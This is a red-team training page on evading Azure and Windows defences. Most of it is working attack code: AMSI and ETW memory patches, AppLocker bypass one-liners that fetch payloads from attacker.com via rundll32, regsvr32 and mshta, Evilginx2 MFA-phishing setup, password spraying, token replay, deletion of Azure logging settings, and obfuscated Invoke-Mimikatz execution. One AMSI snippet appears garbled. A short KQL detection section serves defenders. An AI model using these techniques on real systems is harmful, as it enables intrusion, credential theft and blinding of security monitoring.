---
layout: training-page
title: "Azure Defense Evasion — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - defense-evasion
  - amsi
  - etw
  - conditional-access
  - mfa-bypass
  - sentinel-evasion
  - applocker
page_key: "ad-azure-defense-evasion"
render_with_liquid: false
---

# Azure Defense Evasion

Azure defense evasion targets AMSI, ETW, Windows Defender, Conditional Access policies, Azure Sentinel, and MFA enforcement. Cloud environments add new evasion surfaces — token replay, legacy protocol abuse, and Sentinel log manipulation — alongside traditional endpoint bypasses.

## AMSI Bypass Techniques

AMSI (Antimalware Scan Interface) intercepts PowerShell, JScript, VBScript, and .NET assemblies and passes them to the registered AV engine before execution. Bypassing AMSI is the first step in most PowerShell-based attacks.

### Memory Patching AmsiScanBuffer (PowerShell One-Liner)

```powershell
# Classic byte patch — patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative — force amsiContext to null
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero)

# Method: Patch amsiScanBuf to return 1 (AMSI_RESULT_NOT_DETECTED)
$p = [System.Runtime.InteropServices.Marshal]
$a = $p::GetDelegateForFunctionPointer($p::AllocHGlobal(9),[Action])
[UInt64[]]$c = 0,0x9090_9090_B8_00 + 0x0000_0000 + 0x5BC3_0000
$p::Copy($c,0,$p::GetDelegateForFunctionPointer($p::AllocHGlobal(9),[Action]).Method.MethodHandle.GetFunctionPointer(),9)
```

### C# AMSI Bypass with VirtualProtect

```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr asb = GetProcAddress(amsi, "AmsiScanBuffer");

        // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

        VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProt);
        Marshal.Copy(patch, 0, asb, patch.Length);
        VirtualProtect(asb, (UIntPtr)patch.Length, oldProt, out _);
    }
}
```

```
# Compile and execute
csc.exe /platform:x64 /unsafe AmsiBypass.cs
.\AmsiBypass.exe
```

### AMSI Bypass via COM Object

```powershell
# Use COM object to bypass AMSI without touching AmsiScanBuffer directly
$a = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
[AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
    $_.Location -like "*Microsoft.CSharp*"
} | ForEach-Object { $_.GetType('Microsoft.CSharp.RuntimeBinder.RuntimeBinder') }
```

---

## ETW Bypass Techniques

ETW (Event Tracing for Windows) provides deep visibility into process activity used by EDRs, MDI, and SIEM. Patching ETW suppresses telemetry generation.

### Patching EtwEventWrite

```powershell
# PowerShell ETW bypass — patch EtwEventWrite to return immediately
$code = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr etwWrite = GetProcAddress(ntdll, "EtwEventWrite");
        // ret opcode — immediate return, no events written
        byte[] patch = { 0xC3 };
        VirtualProtect(etwWrite, (UIntPtr)1, 0x40, out uint old);
        Marshal.Copy(patch, 0, etwWrite, 1);
        VirtualProtect(etwWrite, (UIntPtr)1, old, out _);
    }
}
"@

Add-Type $code
[EtwPatch]::Patch()
Write-Host "ETW patched — events suppressed"
```

### Thread Stack Spoofing (Evade Stack-Based Detection)

EDRs check call stacks for suspicious patterns. Spoofing makes malicious calls appear to originate from legitimate Windows APIs:

```
# Tools that implement stack spoofing:
# - SilentMoonwalk
# - ThreadStackSpoofer
# - Foliage

# Concept: replace return addresses on thread stack with legitimate
# ntdll/kernel32 addresses before making suspicious calls
```

---

## AppLocker and WDAC Evasion

### AppLocker Bypass via Trusted Paths

```powershell
# AppLocker typically allows execution from:
# C:\Windows\
# C:\Program Files\

# Bypass via WMIC (LOLBin in trusted path)
wmic process call create "powershell -c <payload>"

# Bypass via rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")

# Bypass via regsvr32 (squiblydoo)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# Bypass via mshta
mshta.exe http://attacker.com/payload.hta

# Write to allowed user-writable paths under C:\Windows
# C:\Windows\Tasks\
# C:\Windows\Temp\
# C:\Windows\tracing\
```

### WDAC Bypass via Compliant Path

```powershell
# WDAC (Windows Defender Application Control) is stronger than AppLocker
# Bypass options are more limited:

# Use signed, allowed binaries that support script execution
# MSBuild.exe — can execute inline C# tasks
# dotnet.exe — runs managed code
# csc.exe — compiles C# on the fly

# MSBuild bypass
msbuild.exe payload.csproj

# where payload.csproj contains:
# <Target Name="X"><MSBuild.Tasks.Exec Command="powershell -c ..." /></Target>
```

---

## MFA Bypass Techniques

### 1. Adversary-in-the-Middle (AiTM) with Evilginx2

Evilginx2 acts as a reverse proxy between the user and Microsoft's login page, capturing session tokens post-MFA.

```bash
# Install Evilginx2
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make

# Configure domain and certificate
./evilginx2 -domain attacker.com -c /root/.evilginx

# Load Microsoft 365 phishlet
phishlets hostname o365 login.attacker.com
phishlets enable o365

# Create a lure URL
lures create o365
lures get-url 0

# Monitor captured sessions
sessions
sessions 0  # export cookies for replay
```

### 2. Legacy Protocol Abuse (Bypass Modern Auth / CA Policies)

Legacy protocols (Basic Auth over IMAP, POP3, SMTP) often bypass Conditional Access policies that target modern authentication flows.

```bash
# Test if legacy protocols are enabled for a tenant
python3 o365spray.py --validate --domain victim.com

# Spray via IMAP/POP3/SMTP (bypasses MFA if Legacy Auth not blocked)
python3 o365spray.py --spray -U users.txt -P passwords.txt \
    --domain victim.com --protocol IMAP

# Access mailbox via IMAP with captured credentials (bypasses CA)
curl --user "user@victim.com:Password123" \
     --ssl-reqd "imaps://outlook.office365.com" \
     -X "LIST \"\" \"*\""
```

**Blue team**: Block legacy authentication with a Conditional Access policy targeting "Other clients" client app type.

### 3. Refresh Token Theft (Bypass MFA Entirely)

If a refresh token is captured after the user completes MFA, it can generate new access tokens indefinitely without re-triggering MFA.

```
Import-Module .\TokenTactics.ps1

# Use captured refresh token to access services (no MFA prompt)
Invoke-RefreshToToken -domain "victim.onmicrosoft.com" -refreshToken "<captured_rt>"
Invoke-RefreshToSharePointToken -domain "victim.onmicrosoft.com" -refreshToken "<captured_rt>"
Invoke-RefreshToMSTeamsToken -domain "victim.onmicrosoft.com" -refreshToken "<captured_rt>"
```

### 4. Consent Grant — MFA Not Triggered

OAuth consent phishing grants the malicious app tokens without any MFA check because the user is consenting to app access, not logging in for an interactive session.

---

## Bypassing Conditional Access

### Token Replay (CA Enforced at Issuance Only)

Conditional Access policies are evaluated when a token is **issued**, not when it is **used**. Capturing a token from a trusted location or device allows replaying it from an untrusted one.

```bash
# Extract session token from a trusted device
# (via LSASS, DPAPI, browser theft)

# Replay the token from an untrusted device/location
curl -H "Authorization: Bearer <captured_token>" \
     "https://graph.microsoft.com/v1.0/me"

# Token works despite CA policy because CA wasn't re-evaluated
```

### Continuous Access Evaluation (CAE) — Blue Team

CAE is Microsoft's mitigation for token replay. CAE-enabled tokens are revoked near-instantly when:
- User is disabled or password changed
- IP address doesn't match the original token's location
- Admin revokes user sessions

```powershell
# Check if CAE is enabled for a specific user
# CAE is enabled per application and resource — not all apps support it
# Force token revocation (triggers CAE revocation for CAE-capable apps)
Revoke-MgUserSignInSession -UserId "<user-object-id>"
```

### CA Policy Exclusion Abuse

```bash
# Enumerate CA policies with exclusions (attack opportunity)
# Excluded users/groups bypass the policy entirely
curl -H "Authorization: Bearer $TOKEN" \
     "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
     | jq '.value[] | {name: .displayName, excludedUsers: .conditions.users.excludeUsers, excludedGroups: .conditions.users.excludeGroups}'

# If your compromised account is in an excluded group → all CA policies bypassed
```

---

## Evading Azure Sentinel Detection

### Low-and-Slow Operation

```bash
# Spread operations over long time windows to avoid threshold-based analytics
# Example: enumerate users 5 at a time, every 10 minutes

for user in $(cat users.txt); do
    curl -H "Authorization: Bearer $TOKEN" \
         "https://graph.microsoft.com/v1.0/users/$user" >> enum_results.json
    sleep 600  # 10-minute delay between requests
done
```

### LOLBin Blending

```powershell
# Use legitimate Azure PowerShell modules to blend with normal admin activity
# Instead of custom tools, use: Az, AzureAD, MSOnline, ExchangeOnlineManagement

# These are less likely to trigger custom Sentinel detections
Connect-AzAccount
Get-AzRoleAssignment  # instead of custom HTTP calls to ARM API
Get-AzureADUser       # instead of custom Graph API calls
```

### Tampering with Diagnostic Settings

```bash
# Disable Key Vault logging (prevents Sentinel from seeing secret access)
az monitor diagnostic-settings delete \
    --resource "/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>" \
    --name "diagnostics"

# Disable Activity Logs forwarding
az monitor diagnostic-settings delete \
    --resource "/subscriptions/<subscription-id>" \
    --name "activityLogs"
```

### Time-Based Evasion

```bash
# Execute during low-visibility hours (weekend, midnight UTC)
# Many SOC teams have reduced coverage and higher SIEM thresholds off-hours

# Check analyst working hours via LinkedIn/company directory before timing operations
```

---

## Obfuscating PowerShell

```powershell
# Invoke-Obfuscation techniques
# Token substitution, string concatenation, encoding

# Base64 encoding
$cmd = 'Get-ADUser -Filter *'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded

# String concatenation to evade signature matching
$x = "Inv"+"oke-Mim"+"ikatz"
IEX $x

# SecureString to store payload (evades some static detection)
$ss = ConvertTo-SecureString -String '<base64_payload>' -AsPlainText -Force
$payload = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($ss))
IEX $payload

# Invoke-Obfuscation — automated obfuscation framework
Import-Module .\Invoke-Obfuscation.ps1
Invoke-Obfuscation -ScriptBlock {Get-ADUser -Filter *} -Command TOKEN\ALL\1
```

---

## Detection

```
// Detect AMSI bypass patterns in PowerShell logs
SecurityEvent
| where EventID == 4104  // Script block logging
| where ScriptBlockText has_any ("AmsiUtils", "amsiInitFailed", "amsiContext", "AmsiScanBuffer")

// Detect suspicious rundll32 or mshta usage
DeviceProcessEvents
| where FileName in ("rundll32.exe", "mshta.exe", "regsvr32.exe")
| where ProcessCommandLine matches regex @"(javascript|vbscript|http|script:)"

// Detect diagnostic settings deletion
AzureActivity
| where OperationNameValue == "microsoft.insights/diagnosticSettings/delete"
| project TimeGenerated, Caller, ResourceId

// Detect legacy auth sign-ins
SigninLogs
| where ClientAppUsed in ("IMAP", "POP3", "SMTP Auth", "Exchange ActiveSync", "Other clients")
| where ResultType == "0"  // Success
| project TimeGenerated, UserPrincipalName, ClientAppUsed, IPAddress
```

## Resources

- Evilginx2 — `github.com/kgretzky/evilginx2`
- Invoke-Obfuscation — `github.com/danielbohannon/Invoke-Obfuscation`
- TokenTacticsV2 — `github.com/f-bader/TokenTacticsV2`
- AMSI bypass collection — `github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell`
- LOLBAS — `lolbas-project.github.io`
- Microsoft CAE documentation — `learn.microsoft.com/en-us/entra/identity/conditional-access/concept-continuous-access-evaluation`
